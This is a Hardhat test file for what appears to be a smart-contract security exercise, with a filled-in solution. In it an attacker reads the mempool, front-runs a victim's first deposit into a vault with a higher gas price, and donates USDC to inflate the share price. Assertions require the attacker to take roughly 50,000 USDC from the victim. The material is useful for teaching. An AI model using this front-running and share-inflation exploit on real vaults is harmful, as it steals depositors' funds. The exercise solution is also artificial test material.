import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { IERC20, OptimizerStrategy, OptimizerVault, YieldContract } from '../../typechain-types';
import {TransactionResponseParams} from "ethers";

const { provider, deployContract, getSigners, parseEther, parseUnits } = ethers;

describe('Optimizer Vaults 101: Exercise 1', () => {
	/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

	let deployer: SignerWithAddress, attacker: SignerWithAddress, bob: SignerWithAddress;

	const ATTACKER_USDC_BALANCE = parseUnits('100000', 6) + 1n; // Attacker has 100,000 + 1 wei USDC
	const BOB_USDC_BALANCE = parseUnits('200000', 6); // Bob has 200,000 USDC

	const USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
	const WHALE_ADDRESS = '0xf977814e90da44bfa03b6295a0616a897441acec';

	let yieldContract: YieldContract;
	let strategy: OptimizerStrategy;
	let vault: OptimizerVault;
	let usdc: IERC20;

	before(async () => {
		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
		[deployer, attacker, bob] = await getSigners();

		// Whale impersonation
		const whaleSigner = await ethers.getImpersonatedSigner(WHALE_ADDRESS);

		// Set attacker, bob, & whale balance to 2 ETH
		await provider.send('hardhat_setBalance', [
			attacker.address,
			'0x1BC16D674EC80000', // 2 ETH (ETH -> WEI -> Hexdecimal)
		]);
		await provider.send('hardhat_setBalance', [
			whaleSigner.address,
			'0x1BC16D674EC80000', // 2 ETH (ETH -> WEI -> Hexdecimal)
		]);
		await provider.send('hardhat_setBalance', [
			bob.address,
			'0x1BC16D674EC80000', // 2 ETH (ETH -> WEI -> Hexdecimal)
		]);
		// Load tokens
		usdc = (await ethers.getContractAt('@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20', USDC_ADDRESS)) as unknown as IERC20;
		// Deploy the vault system
		yieldContract = await deployContract('YieldContract', [USDC_ADDRESS]);
		strategy = await deployContract('OptimizerStrategy', [yieldContract.target]);
		vault = await deployContract('OptimizerVault', [strategy.target, 'VAULT', 'VLT']);

		// Transfer USDC to the attacker & bob
		await usdc.connect(whaleSigner).transfer(attacker.address, ATTACKER_USDC_BALANCE);
		await usdc.connect(whaleSigner).transfer(bob.address, BOB_USDC_BALANCE);

		// Assign the vault to the strategy
		await strategy.setVault(vault.target);

		// Approve the vault for the attacker & bob
		await usdc.connect(attacker).approve(vault.target, ATTACKER_USDC_BALANCE);
		await usdc.connect(bob).approve(vault.target, BOB_USDC_BALANCE);

		await ethers.provider.provider.send("evm_increaseTime", [10000]);
		await ethers.provider.send("evm_mine", []);

		// Bob initiates a tx to be the first depositor in the vault system
		await vault.connect(bob).deposit(BOB_USDC_BALANCE);
	});

	it('Exploit', async () => {
		//////////////////////////////////////////////////////////////////////////
		// Get all the tx's in the mempool
		const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
			"pending",
			true,
		]);

		pendingBlock.transactions.find((tx) =>
			// if (tx.to?.toLowerCase() == (vault.target as string).toLowerCase()) {
				console.log("pendingBlock tx:", tx)
			// }
		);

		// TODO: You see that bob is going to be the first depositor in the vault, with $200,000. Find his Tx
		const bobDeposit = pendingBlock.transactions.find((tx) => tx.to?.toLowerCase() == (vault.target as string).toLowerCase());




		// TODO: You front-run bob so that you are the first depositor
		await vault.connect(attacker).deposit(BigInt(1), {
			gasPrice: BigInt(bobDeposit.gasPrice) + BigInt(1)
		});

		// TODO: You do something sneaky that allows you to take some of bob's funds!
		await usdc.connect(attacker).transfer(vault.target, parseUnits("100000", 6), {
			gasPrice: BigInt(bobDeposit.gasPrice) + BigInt(1)
		});

		const pendingBlock2 = await ethers.provider.send("eth_getBlockByNumber", [
			"pending",
			true,
		]);
		pendingBlock2.transactions.find((tx) =>
				// if (tx.to?.toLowerCase() == (vault.target as string).toLowerCase()) {
				console.log("pendingBlock2 tx:", tx)
			// }
		);

		await ethers.provider.provider.send("evm_increaseTime", [10000]);
		await ethers.provider.send("evm_mine", []);
		const block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
		console.log(block?.transactions);


		// Withdraw vault balance
		const attackerVaultBalance = await vault.balanceOf(attacker);
		console.log("Attacker vault balance: ", attackerVaultBalance.toString());
		await vault.connect(attacker).withdraw(attackerVaultBalance);
	});

	after(async () => {
		/** SUCCESS CONDITIONS */

		await ethers.provider.provider.send("evm_increaseTime", [10000]);
		await provider.send('evm_mine', []);

		const block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
		console.log(block?.transactions);

		// Attacker realizes at least $48,000 USDC gain
		expect(await usdc.balanceOf(attacker.address)).is.gt(ATTACKER_USDC_BALANCE + parseUnits('48000', 6));

		// Bob withdraws his vault balance
		const bobVaultBalance = await vault.balanceOf(bob.address);
		await vault.connect(bob).withdraw(bobVaultBalance);

		// Bob loses roughly $50,000 USDC when he withdraws
		expect(await usdc.balanceOf(bob.address)).is.lt(BOB_USDC_BALANCE - parseUnits('49000', 6));
	});
});
